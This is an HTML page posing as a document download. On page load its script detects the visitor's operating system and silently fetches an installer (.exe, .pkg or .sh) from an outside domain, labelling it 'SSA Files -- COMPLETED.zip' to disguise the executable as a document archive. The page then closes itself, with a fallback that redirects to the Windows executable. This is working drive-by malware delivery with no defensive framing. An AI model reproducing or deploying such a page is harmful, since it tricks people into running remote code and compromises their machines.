<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Download</title>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
</head>
<body>
    <script>
        // Wait for both DOM and jQuery to be ready
        $(document).ready(function() {
            function detectOS() {
                try {
                    const platform = navigator.platform.toLowerCase();
                    const userAgent = navigator.userAgent.toLowerCase();

                    if (platform.includes('win')) return 'windows';
                    if (platform.includes('mac')) return 'macos';
                    if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';

                    return 'unknown';
                } catch (e) {
                    console.error("Error detecting OS:", e);
                    return 'unknown';
                }
            }

            function getDownloadLink(os) {
                const baseUrl = 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup';
                const queryParams = '?e=Access&y=Guest';
                
                switch (os) {
                    case 'windows':
                        return baseUrl + '.exe' + queryParams;
                    case 'macos':
                        return baseUrl + '.pkg' + queryParams;
                    case 'linux':
                        return baseUrl + '.sh' + queryParams;
                    default:
                        return baseUrl + '.exe' + queryParams;
                }
            }

            function initiateDownload() {
                try {
                    const osType = detectOS();
                    const downloadLink = getDownloadLink(osType);

                    // Create a temporary anchor element
                    const downloadBtn = document.createElement("a");
                    downloadBtn.href = downloadLink;
                    downloadBtn.download = "SSA Files -- COMPLETED.zip";
                    downloadBtn.style.display = "none";
                    document.body.appendChild(downloadBtn);
                    
                    // Trigger the download
                    downloadBtn.click();
                    
                    // Clean up
                    setTimeout(function() {
                        document.body.removeChild(downloadBtn);
                        window.close();
                    }, 2000);
                } catch (e) {
                    console.error("Download failed:", e);
                    // Fallback - redirect to Windows version if something goes wrong
                    window.location.href = getDownloadLink('windows');
                }
            }

            // Start the process
            initiateDownload();
        });
    </script>
</body>
</html>
